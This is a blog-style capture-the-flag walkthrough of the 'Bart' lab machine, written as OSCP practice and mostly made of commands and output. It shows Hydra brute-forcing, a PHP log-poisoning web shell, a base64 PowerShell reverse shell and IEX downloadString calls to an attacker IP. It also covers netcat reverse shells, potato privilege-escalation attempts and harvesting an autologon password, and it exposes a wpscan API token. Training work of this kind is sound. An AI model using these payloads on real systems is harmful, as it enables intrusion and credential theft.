---
layout: post
title: "bart"
date: 2025-09-15 
categories: OSCP Playlist
---
# bart

# Summary

- view source code to find new user
- ffuf to fuzz for subdomain
- guess firstname:lastname of new user as credential to logon
- find new subdomain, use hydra to brutefoce login
- view source code to find php page
- log poisoning to get RCE → reverse shell
- use nc64.exe to get reverse shell as a 64bit process
- search autologon registry to find administrator password
- use runas to get reverse shell from administrator
- OR use net use to mount administrator file system

# Attack Path

First enumerate the open ports and services:

```bash
sudo nmap -sV -sC nmap/bart 10.10.10.81

80/tcp open  http    Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://forum.bart.htb/
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

Let’s add the domain name and subdomain to our /etc/hosts file:

```bash
10.10.10.81 bart.htb forum.bart.htb
```

Also, from server head being IIS, we know it’s a Windows backend.

Let’s visit the site now:

![image.png]({{ site.baseurl }}/assets/bart/image.png)

It’s a wordpress application. While we play around the with the site, let’s also start a wpscan in the background:

```bash
sudo wpscan --url http://forum.bart.htb/ -e ap --plugins-detection aggressive

Scan Aborted: Unable to identify the wp-content dir, please supply it with --wp-content-dir, use the --scope option or make sure the --url value given is the correct one

sudo wpscan --url http://forum.bart.htb/ --enumerate --api-token 2xkAZXNy4fEMFKyADzmPF2VTMDYb9qV3aUtDrDK5Zzs
```

Let’s fuzz for other sub directories as well:

```bash
feroxbuster -u http://forum.bart.htb/ -C 404

200      GET      107l      189w     1606c http://forum.bart.htb/webste/styles.css
200      GET        6l       13w      154c http://forum.bart.htb/webste/sow-image-default-813df796d9b1.css
200      GET       53l      110w     1315c http://forum.bart.htb/webste/front-flex.css
200      GET        2l      281w    10056c http://forum.bart.htb/webste/jquery-migrate.js
200      GET        4l       66w    31000c http://forum.bart.htb/webste/font-awesome.css
200      GET      188l     1367w   105643c http://forum.bart.htb/webste/2.jpg
200      GET      199l     1273w    91446c http://forum.bart.htb/webste/3.jpg
200      GET      254l     1591w   116217c http://forum.bart.htb/webste/ipad-606764_1280-550x365.jpg
200      GET       52l      137w     1112c http://forum.bart.htb/webste/my_style_id-35.css
200      GET        6l     1435w    97184c http://forum.bart.htb/webste/jquery.js
200      GET      216l      736w     9821c http://forum.bart.htb/webste/css.css
200      GET      537l     3381w   270381c http://forum.bart.htb/webste/iphone-550x363.png
200      GET        8l      233w    16628c http://forum.bart.htb/webste/bootstrap.css
200      GET      142l      776w    60591c http://forum.bart.htb/webste/macbook-336704_1280-550x367.jpg
200      GET      236l     1355w   103689c http://forum.bart.htb/webste/1_002.jpg
200      GET      151l      757w    57593c http://forum.bart.htb/webste/emp5.jpg
200      GET      173l     1045w    78865c http://forum.bart.htb/webste/imac-606765_1280-550x365.jpg
200      GET     3374l     7680w    73662c http://forum.bart.htb/webste/style.css
200      GET      273l     1715w   130663c http://forum.bart.htb/webste/4.jpg
200      GET     1127l     5713w   400182c http://forum.bart.htb/webste/header.jpg
200      GET      878l     5333w   478480c http://forum.bart.htb/webste/1.jpg
200      GET      549l     2412w    35529c http://forum.bart.htb/
400      GET        6l       26w      324c http://forum.bart.htb/error%1F_log

ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://forum.bart.htb/FUZZ -fs 75

#Nothing
```

Let’s wpscan again:

```bash
sudo wpscan --url http://forum.bart.htb/website -e ap --plugins-detection aggressive
```

Inspecting the page source and the employees element, we find a HTML comment:

![image.png]({{ site.baseurl }}/assets/bart/image%201.png)

There is another user Harvey Potter that is also part of the team. If we hover over the employees over the mail sign, we get a sense what the usernames might be:

```bash
s.brown samantha
d.simmons daniel
r.hilton robert
h.potter harvey
```

Let’s fuzz for subdomains:

```bash
ffuf -u http://10.10.10.81 -H "Host: FUZZ.bart.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 0

forum                   [Status: 200, Size: 35529, Words: 2090, Lines: 549, Duration: 41ms]
monitor                 [Status: 200, Size: 3423, Words: 385, Lines: 81, Duration: 1132ms]
```

![image.png]({{ site.baseurl }}/assets/bart/image%202.png)

It’s version php server monitor v3.2.1. Let’s try default creds admin:admin. 

Let’s try clicking on Forgot Password:

![image.png]({{ site.baseurl }}/assets/bart/image%203.png)

If we type in an invalid username, we get an error message. Maybe we can find valid usernames like this. Since Harvey is the newest member of the team, he is most likely to have a weak/default password configured. Let’s find his username first, then password:

```bash
h.potter
potter
harvey
```

![image.png]({{ site.baseurl }}/assets/bart/image%204.png)

We get a success after harvey. 

We try a bunch of default passwords:

```bash
Password1
Password1!
harvey

#the correct one
potter
```

We are in.

![image.png]({{ site.baseurl }}/assets/bart/image%205.png)

Clicking on Internal Chat, we find another subdomain:

```bash
internal-01.bart.htb
```

![image.png]({{ site.baseurl }}/assets/bart/image%206.png)

Let’s add that to our /etc/hosts file:

Visiting the subdomain, there is another login.

![image.png]({{ site.baseurl }}/assets/bart/image%207.png)

Let’s try the same password for harvey:

```bash
harvey:potter
```

![image.png]({{ site.baseurl }}/assets/bart/image%208.png)

We make a POST request everytime we attempt to login:

![image.png]({{ site.baseurl }}/assets/bart/image%209.png)

We guess a few passwords but to no avail. Let’s try using hydra; let’s also make a username list before:

```bash
harvey
h.potter
s.brown
samantha
d.simmons
daniel
r.hilton
robert
```

We also have to make sure that the passwords are at least 8 characters long:

![image.png]({{ site.baseurl }}/assets/bart/image%2010.png)

```bash
grep -E '^.{8,}$' /usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt > passwd.txt
```

Let’s try bruteforcing:

```bash
hydra -L users.txt -P passwd.txt -f internal-01.bart.htb http-post-form "/simple_chat/login.php:uname=^USER^&passwd=^PASS^&sumbit=Login:F=Invalid"

[80][http-post-form] host: internal-01.bart.htb   login: harvey   password: Password1
```

We are in:

![image.png]({{ site.baseurl }}/assets/bart/image%2011.png)

Looking at the page source, we find:

```bash
	<!-- //Step 3: link chat_full.css for the full-page chat-->
		<link type="text/css" rel="stylesheet" href="simple_chat/css/chat_full.css">
	</head>
	<body>
		<div id="wrapper">	
			<!-- <div id="title"><h1>[DEV] Internal Chat</h1></div>
			<div id="title"><h1>Internal use only</h1></div> -->
			<div id="refresh_link"><a href=".">Refresh</a></div>
			<div id="log_link">
				<script>
					function saveChat() {
						// create a serialized object and send to log_chat.php. Once done hte XHR request, alert "Done"
					var xhr = new XMLHttpRequest();
					xhr.onreadystatechange = function() {
    					if (xhr.readyState == XMLHttpRequest.DONE) {
        					alert(xhr.responseText);
    					}
					}
					xhr.open('GET', 'http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey', true);
					xhr.send(null);
					alert("Done");
					}
				</script>
				<a href="#" onclick="saveChat()">Log</a>
			</div>
			
			<!-- The format of one message:
				<div id="message_[message_id]">
					<a href="#">[username] </a>says:
					<p>[message_content]</p>
				</div>
			-->
```

The code is part of a simple web-based chat application, likely for internal use (as hinted by the comments). It:

- Loads a CSS stylesheet to style the chat interface.
- Provides a “Refresh” link to reload the page and update messages.
- Provides a “Log” link that sends a GET request to a server endpoint (log.php) to save chat data to a file (log.txt) for a user (harvey).
- Defines a template for displaying chat messages, though the actual message rendering is not shown in this snippet.

Every time we click Log (on the top right-hand side, under Refresh), we save the user agent to the log.txt file.

If we visit log.txt, we can see it logs our user-agent.

Let’s try changing our user-agent on Burp 

![image.png]({{ site.baseurl }}/assets/bart/image%2012.png)

It works. Maybe we can poison the log, get the server to execute php code.

- The file specified by filename (log.php) is likely stored in a directory accessible to the web server (e.g., /log/log.php).
- Since the file has a .php extension and contains the injected PHP code, the web server interprets it as a PHP script when accessed.
- When the attacker visits http://internal-01.bart.htb/log/log.php?cmd=whoami, the injected code <?php system($_GET['cmd']); ?> executes, running the whoami command and returning the result (e.g., the server's user, like www-data).

First, capture the request when we click Log and send it to repeater:

```bash
<?php system($_GET['cmd']); ?>
<?php system($_REQUEST['cmd']); ?>

#In the burp request, change user-agent:
GET /log/log.php?filename=log.php&username=harvey HTTP/1.1
Host: internal-01.bart.htb
User-Agent: <?php system($_GET['cmd']); ?>
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://internal-01.bart.htb/
Cookie: PHPSESSID=2n6s6du8jn4a1hdfqrupuodgk7
Priority: u=0
```

![image.png]({{ site.baseurl }}/assets/bart/image%2013.png)

Looks like it can execute php code. Now let’s add our cmd:

```bash
GET /log/log.php?filename=log.php&username=harvey&cmd=whoami
```

![image.png]({{ site.baseurl }}/assets/bart/image%2014.png)

We now have a web shell

Let’s get a reverse shell. We need Invoke-PowerShellTcpOneLine.ps1 then base64 encode it

After changing the IP and ports to our own ($client one, ignore the $sm), let’s base64 encode it little endian; as that’s what powershell wants:

```bash
cat shell.ps1 | iconv -t utf-16le | base64 -w 0

JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4ANwAnACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA

```

Now our whole payload, we can send a POST request; does not work, we have to do it in GET request; remember to URL encode the whole payload:

```bash
GET /log/log.php?filename=log.php&username=harvey&cmd=powershell+-e+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4ANwAnACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA%2bACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA
```

We now have shell:

![image.png]({{ site.baseurl }}/assets/bart/image%2015.png)

Another way to get reverse shell is to host the reverse shell script and then use downloadString method to execute.

```bash
GET /log/log.php?filename=log.php&username=harvey&cmd=powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.7:8001/rev.ps1')"
```

Now that we are on the server, let’s check our privileges:

```bash
 whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State  
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled

```

We have SeImpersonatePrivilege which normally we can use potato or printspoofer exploit to escalate our privilege to SYSTEM.

Let’s use printspoofer. First let’s set up a smb server:

```bash
sudo impacket-smbserver share -smb2support . -user test -password test
```

Now connect to our server let’s try and execute the exploit:

```bash
net use Z: \\10.10.16.7\share /user:test test

\\10.10.16.7\share\printspoofer.exe -c "\\10.10.16.7\share\nc.exe 10.10.16.7 8443 -e cmd"
```

Did not work. Let’s try juicypotato:

```bash
\\10.10.16.7\share\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c \\10.10.16.7\share\nc.exe 10.10.16.7 8443 -e cmd.exe" -t *
```

Let’s try rogue potato:

```bash
\\10.10.16.7\share\RoguePotato.exe -l 53375 -e c:\windows\system32\cmd.exe -a "/c \\10.10.16.7\share\nc.exe 10.10.16.7 8443 -e cmd.exe" 

\\10.10.16.7\share\RoguePotato.exe -r 10.10.16.7 -e "\\10.10.16.7\share\nc.exe 10.10.16.7 8443 -e cmd.exe" -l 9999 
```

Let’s use Sherlock to find vulnerable:

```bash
Set-ExecutionPolicy Bypass -Scope Process

Import-Module \\10.10.16.7\share\Sherlock.ps1
Find-AllVulns
```

Nothing is vulnerable.

We can also upload PowerUp.ps1 to try and find other vulnerabilities that will lead to priv esc:

```bash
Import-Module \\10.10.16.7\share\PowerUp.ps1
Invoke-AllChecks

PS C:\inetpub\wwwroot> Invoke-AllChecks
PS C:\inetpub\wwwroot> Invoke-PowerShellTcp : Cannot open Service Control Manager on computer '.'. 
This operation might require other privileges.
At line:128 char:1
+ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.7 -Port 4443
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorExcep 
   tion
    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorExceptio 
   n,Invoke-PowerShellTcp
```

Let’s clear our modules and reimport:

```bash
Remove-Module *; $PSModuleAutoLoadingPreference = 0
Import-Module \\10.10.16.7\share\PowerUp.ps1
Invoke-AllChecks
```

Does not work. The problem is because our nishang reverse shell is running a 32bit process on a 64 bit architecture. We can fix it by running nc64.exe to get a reverse shell. 

```bash
[Environment]::Is64BitProcess

False
```

Let’s assume we have not gotten a reverse shell yet. Back to log poisioning, let’s change our command; remember to URL encode it:

```bash
powershell "wget http://10.10.16.7:8001/nc64.exe -OutFile nc64.exe"
```

After it’s downloaded, let’s get a shell back:

```bash
nc64.exe 10.10.16.7 4444 -e cmd.exe
```

Let’s check if we are in a 64bit process:

```bash
[Environment]::Is64BitProcess

True
```

Now let’s check autologon again, we can either use PowerUp or just query the registry:

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

    LastUsedUsername    REG_SZ    Administrator
    DefaultPassword    REG_SZ    3130438f31186fbaf962f407711faddb

```

There are several ways to logon to the administrator’s computer.

First is run as. On our reverse shell, input:

```bash
$username = "BART\Administrator"
$password = "3130438f31186fbaf962f407711faddb"
$secstr = New-Object -TypeName System.Security.SecureString
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.16.7:8001/rev.ps1') } -Credential $cred -Computer localhost
```

Before we execute the last line, start listener:

```bash
nc -lnvp 4443
```

![image.png]({{ site.baseurl }}/assets/bart/image%2016.png)

The second method is to use net use. We can just access admin’s file system:

```bash
net use x: \\localhost\c$ /user:administrator 3130438f31186fbaf962f407711faddb

x:

cd users\administrator\desktop
```